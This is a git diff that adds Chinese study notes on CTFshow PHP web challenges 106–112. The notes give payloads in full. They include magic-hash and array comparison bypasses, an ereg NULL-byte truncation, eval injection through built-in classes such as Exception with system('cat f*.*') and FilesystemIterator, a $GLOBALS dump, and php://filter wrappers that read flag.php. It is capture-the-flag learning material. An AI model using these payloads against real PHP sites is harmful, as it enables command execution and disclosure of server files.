@@ -1,4 +1,5 @@
 # PHP特性
+[特性总结](https://www.anquanke.com/post/id/231507/)
 **[CTFshow89-150](https://ctf.show/challenges)**
 **[学长笔记](https://exp10it.io/posts/ctfshow-web-php-89-110-writeup/)**
 **·89**
@@ -234,6 +235,92 @@ GET 传递 ?suces=flag&flag=, 同时 POST flag=
 
 ![10](TU/PHP4x18_1.png)
 pyload=`URL/?suces=flag&, 同时 POST error=suces`
+
+**106**
+![11](TU/PHP4x19.png)
+POST v1  GET v2
+[sha1()](https://www.php.net/manual/zh/function.sha1.php) — 计算字符串的 sha1 散列值
+构造满足条件的v1v2就行
+数组绕过/用0e
+
+**107**
+![12](TU/PHP4x20.png)
+[parse_str()](https://www.php.net/manual/zh/function.parse-str.php) — 解析查询字符串
+解析，并将 key 设置到指定  数组中
+v1=flag=0  ---------->传入数组flag=0
+v3=240610708--------->md5为0E
+这里用的是‘==’v3就按照0来比较
+`$v2['flag']`数组flag值为0
+
+换个姿势 数组
+GET: ?v3[]= POST: v1=
+**108**
+![13](TU/PHP4x21.png)
+**[ereg()]**:执行正则表达式匹配。c的前后都要为字母。存在NULL截断漏洞 %00 后面的不参与匹配。
+**[strrev()](https://www.php.net/manual/zh/function.strrev.php)**:返回字符串的反向字符串。
+然后再取整，与0x36d比较（0x36d=877，比较时自动转为10进制）
+?c=aa%00778
+
+**109**
+![14](TU/image%20copy.png)
+?v1=Exception&v2=system('cat f*.*') 
+
+Exception异常处理类作用是**绕过语法错误**
+`echo new Exception(system('cat f*.*'));`
+先执行system然后传给Exception类，Exception类会自动输出异常信息。
+
+因为这里   `eval("echo new $v1($v2());")`  new  一个类。v1需要纯字母，下面的内置类都可以用。
+合法的 PHP 内置类|含义
+------|--------
+Exception    |异常处理类 处理程序运行中的错误
+ReflectionClass|反射类  “偷看” 其他类的内部信息
+FilesystemIterator|文件系统迭代器类 遍历目录里所有文件
+stdClass|标准类 PHP 内置的 “空类”
+DirectoryIterator|目录迭代器类 也是用来遍历目录的类
+
+**110**
+![15](TU/image.png)
+穿过正则
+执行`eval("echo new $v1($v2());");`
+echo new $v1($v2());
+?v1=FilesystemIterator&v2=getcwd
+**PHP内置类** 利用 FilesystemIterator 获取指定目录下的所有文件。new一个类对象。
+[getcwd()](https://www.php.net/manual/zh/function.getcwd.php) 函数 获取当前工作目录
+echo new FilesystemIterator(getcwd());
+
+**111**
+![16](TU/image%20copy%202.png)
+绕过正则，当v1=ctfshow的时候执行getFlag
+include("flag.php"); 需要用到全局变量 `GLOBALS 常量数组` 才可以看到flag
+getFlag
+eval("$$v1 = &$$v2;");       `&`引用赋值  这里是`$ctfshow`=&`$GLOBALS`
+var_dump($$v1);   `var_dump($ctfshow);`--->`var_dump($GLOBALS);`
+
+?v1=ctfshow&v2=GLOBALS
+
+**112**
+![17](TU/image%20copy%203.png)
+[is_file()](https://www.php.net/manual/zh/function.is-file.php) 函数用于检查文件是否存在。
+如果文件存在且为正常的文件则返回 true，否则返回 false。这里if条件有`！`
+
+php://filter/resource=flag.php
+php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
+php://filter/read=convert.quoted-printable-encode/resource=flag.php
+compress.zlib://flag.php
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
